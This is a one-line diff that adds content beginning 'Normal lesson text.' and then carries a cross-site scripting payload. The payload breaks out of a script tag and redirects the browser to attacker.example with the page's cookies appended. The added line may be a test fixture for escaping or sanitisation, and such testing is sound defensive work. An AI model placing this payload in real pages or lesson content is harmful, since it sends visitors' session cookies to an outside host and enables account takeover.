@@ -1,0 +1,1 @@
+Normal lesson text.</script><script>document.location='https://attacker.example/?c='+document.cookie</script><script>
